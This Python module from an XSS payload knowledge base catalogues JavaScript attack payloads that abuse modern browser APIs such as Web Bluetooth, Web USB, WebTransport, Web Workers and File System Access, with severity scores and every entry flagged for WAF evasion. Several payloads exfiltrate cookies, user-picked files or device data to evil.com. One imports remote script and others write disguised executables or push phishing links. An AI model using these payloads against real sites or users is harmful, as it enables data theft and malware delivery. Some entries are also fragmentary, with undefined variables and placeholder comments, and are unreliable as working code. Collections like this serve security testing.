#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Active
Telegram: https://t.me/EasyProTech

Modern Browser APIs XSS Payloads
Web Bluetooth, Web Locks, Web Serial, Web Share, Web USB, WebCodecs, WebGPU, WebNN, WebTransport, Web Workers, File System Access, etc.
"""

from ..models import Encoding, PayloadEntry, Reliability, Severity


# === Web Bluetooth Payloads ===
WEB_BLUETOOTH_PAYLOADS = {
    "web-bluetooth-exfil": PayloadEntry(
        payload='navigator.bluetooth.requestDevice({filters:[{services:["battery_service"]}]}).then(d=>d.gatt.connect()).then(s=>s.getPrimaryService("battery_service")).then(s=>s.getCharacteristic("battery_level")).then(c=>fetch("https://evil.com/"+c.value))',
        contexts=["web_bluetooth", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Web Bluetooth API data exfiltration",
        tags=["web-bluetooth", "exfil", "gatt", "ble"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "web-bluetooth-device-enum": PayloadEntry(
        payload="navigator.bluetooth.requestDevice({acceptAllDevices:true}).then(d=>console.log(d.name))",
        contexts=["web_bluetooth", "javascript"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="Web Bluetooth device enumeration",
        tags=["web-bluetooth", "enumeration", "device", "privacy"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Web Locks Payloads ===
WEB_LOCKS_PAYLOADS = {
    "web-locks-dos": PayloadEntry(
        payload='navigator.locks.request("critical", {mode: "exclusive"}, async lock => { await new Promise(() => {}); })',
        contexts=["web_locks", "javascript"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="Web Locks API denial of service",
        tags=["web-locks", "dos", "exclusive", "deadlock"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "web-locks-race": PayloadEntry(
        payload='navigator.locks.request("shared", async lock => { /* race condition */ })',
        contexts=["web_locks", "javascript"],
        severity=Severity.MEDIUM,
        cvss_score=4.0,
        description="Web Locks race condition exploit",
        tags=["web-locks", "race", "shared", "concurrency"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Web Serial Payloads ===
WEB_SERIAL_PAYLOADS = {
    "web-serial-command": PayloadEntry(
        payload='navigator.serial.requestPort().then(port=>port.open({baudRate:9600})).then(()=>{const writer=port.writable.getWriter();writer.write(new TextEncoder().encode("AT+CMD"))})',
        contexts=["web_serial", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="Web Serial API command injection",
        tags=["web-serial", "command", "injection", "hardware"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "web-serial-exfil": PayloadEntry(
        payload='port.readable.getReader().read().then(({value})=>fetch("https://evil.com/"+btoa(value)))',
        contexts=["web_serial", "javascript"],
        severity=Severity.HIGH,
        cvss_score=8.0,
        description="Web Serial data exfiltration",
        tags=["web-serial", "exfil", "data", "hardware"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Web Share Payloads ===
WEB_SHARE_PAYLOADS = {
    "web-share-phishing": PayloadEntry(
        payload='navigator.share({title:"Urgent",text:"Click: ",url:"https://evil.com/phish"})',
        contexts=["web_share", "javascript"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="Web Share API for phishing",
        tags=["web-share", "phishing", "social", "share"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "web-share-file": PayloadEntry(
        payload='navigator.share({files:[new File(["malware"],"evil.exe",{type:"application/octet-stream"})]})',
        contexts=["web_share", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="Web Share API file sharing",
        tags=["web-share", "file", "malware", "distribution"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Web USB Payloads ===
WEB_USB_PAYLOADS = {
    "web-usb-firmware": PayloadEntry(
        payload='navigator.usb.requestDevice({filters:[]}).then(d=>d.open()).then(()=>d.controlTransferOut({requestType:"vendor",recipient:"device",request:0x01,value:0,index:0},firmwareData))',
        contexts=["web_usb", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.5,
        description="Web USB firmware upload/modification",
        tags=["web-usb", "firmware", "hardware", "attack"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "web-usb-exfil": PayloadEntry(
        payload='device.transferIn(1,64).then(r=>fetch("https://evil.com/"+btoa(new Uint8Array(r.data.buffer))))',
        contexts=["web_usb", "javascript"],
        severity=Severity.HIGH,
        cvss_score=8.0,
        description="Web USB data exfiltration",
        tags=["web-usb", "exfil", "data", "hardware"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === WebCodecs Payloads ===
WEBCODECS_PAYLOADS = {
    "webcodecs-decoder-crash": PayloadEntry(
        payload='new VideoDecoder({output:()=>{},error:e=>fetch("https://evil.com/?e="+e)}).configure({codec:"vp8"});decoder.decode(malformedChunk)',
        contexts=["webcodecs", "javascript"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="WebCodecs decoder crash/error leak",
        tags=["webcodecs", "decoder", "crash", "error"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "webcodecs-timing": PayloadEntry(
        payload="const start=performance.now();await decoder.decode(chunk);const time=performance.now()-start;/* timing side-channel */",
        contexts=["webcodecs", "javascript"],
        severity=Severity.LOW,
        cvss_score=3.0,
        description="WebCodecs timing side-channel",
        tags=["webcodecs", "timing", "side-channel"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === WebGPU Payloads ===
WEBGPU_PAYLOADS = {
    "webgpu-shader-injection": PayloadEntry(
        payload="device.createShaderModule({code:userInput}); // WGSL injection",
        contexts=["webgpu", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="WebGPU shader code injection",
        tags=["webgpu", "shader", "wgsl", "injection"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "webgpu-buffer-exfil": PayloadEntry(
        payload='await buffer.mapAsync(GPUMapMode.READ);const data=new Uint8Array(buffer.getMappedRange());fetch("https://evil.com/?d="+btoa(data))',
        contexts=["webgpu", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="WebGPU buffer data exfiltration",
        tags=["webgpu", "buffer", "exfil", "data"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === WebNN Payloads ===
WEBNN_PAYLOADS = {
    "webnn-model-injection": PayloadEntry(
        payload="const context=await navigator.ml.createContext();const builder=new MLGraphBuilder(context); /* model injection */",
        contexts=["webnn", "javascript"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="WebNN neural network model injection",
        tags=["webnn", "ml", "model", "injection"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "webnn-inference-timing": PayloadEntry(
        payload="const start=performance.now();await context.compute(graph,inputs,outputs);/* inference timing attack */",
        contexts=["webnn", "javascript"],
        severity=Severity.LOW,
        cvss_score=3.0,
        description="WebNN inference timing side-channel",
        tags=["webnn", "timing", "inference", "side-channel"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === WebTransport Payloads ===
WEBTRANSPORT_PAYLOADS = {
    "webtransport-exfil": PayloadEntry(
        payload='const wt=new WebTransport("https://evil.com");await wt.ready;const writer=wt.datagrams.writable.getWriter();writer.write(new TextEncoder().encode(document.cookie))',
        contexts=["webtransport", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=8.5,
        description="WebTransport data exfiltration",
        tags=["webtransport", "exfil", "datagram", "cookie"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "webtransport-stream": PayloadEntry(
        payload="const stream=await wt.createUnidirectionalStream();const writer=stream.getWriter();writer.write(sensitiveData)",
        contexts=["webtransport", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="WebTransport stream data leak",
        tags=["webtransport", "stream", "unidirectional", "exfil"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Web Workers Payloads ===
WEBWORKER_PAYLOADS = {
    "worker-blob-xss": PayloadEntry(
        payload='new Worker(URL.createObjectURL(new Blob([`importScripts("https://evil.com/xss.js")`],{type:"application/javascript"})))',
        contexts=["webworker", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=8.5,
        description="Web Worker blob URL with importScripts",
        tags=["worker", "blob", "importScripts", "xss"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "worker-postMessage": PayloadEntry(
        payload='worker.postMessage({cmd:"eval",code:"alert(1)"})',
        contexts=["webworker", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Web Worker postMessage command injection",
        tags=["worker", "postMessage", "command", "injection"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "worker-shared-data": PayloadEntry(
        payload="new SharedWorker(URL.createObjectURL(new Blob([`self.onconnect=e=>{e.ports[0].postMessage(globalData)}`])))",
        contexts=["webworker", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="SharedWorker data exfiltration",
        tags=["worker", "shared", "exfil", "data"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === File System Access API Payloads ===
FILE_SYSTEM_ACCESS_PAYLOADS = {
    "fsa-read-sensitive": PayloadEntry(
        payload='const handle=await window.showOpenFilePicker();const file=await handle[0].getFile();const text=await file.text();fetch("https://evil.com/?d="+encodeURIComponent(text))',
        contexts=["file_system_access", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="File System Access API file read exfiltration",
        tags=["fsa", "file", "read", "exfil"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "fsa-write-malware": PayloadEntry(
        payload='const handle=await window.showSaveFilePicker({suggestedName:"update.exe"});const writable=await handle.createWritable();await writable.write(malwareBlob);await writable.close()',
        contexts=["file_system_access", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.5,
        description="File System Access API malware write",
        tags=["fsa", "file", "write", "malware"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "fsa-directory-traversal": PayloadEntry(
        payload="const dirHandle=await window.showDirectoryPicker();for await(const entry of dirHandle.values()){/* enumerate files */}",
        contexts=["file_system_access", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="File System Access directory enumeration",
        tags=["fsa", "directory", "enumeration", "traversal"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# Combined database
MODERN_BROWSER_APIS_PAYLOADS = {
    **WEB_BLUETOOTH_PAYLOADS,
    **WEB_LOCKS_PAYLOADS,
    **WEB_SERIAL_PAYLOADS,
    **WEB_SHARE_PAYLOADS,
    **WEB_USB_PAYLOADS,
    **WEBCODECS_PAYLOADS,
    **WEBGPU_PAYLOADS,
    **WEBNN_PAYLOADS,
    **WEBTRANSPORT_PAYLOADS,
    **WEBWORKER_PAYLOADS,
    **FILE_SYSTEM_ACCESS_PAYLOADS,
}

MODERN_BROWSER_APIS_TOTAL = len(MODERN_BROWSER_APIS_PAYLOADS)
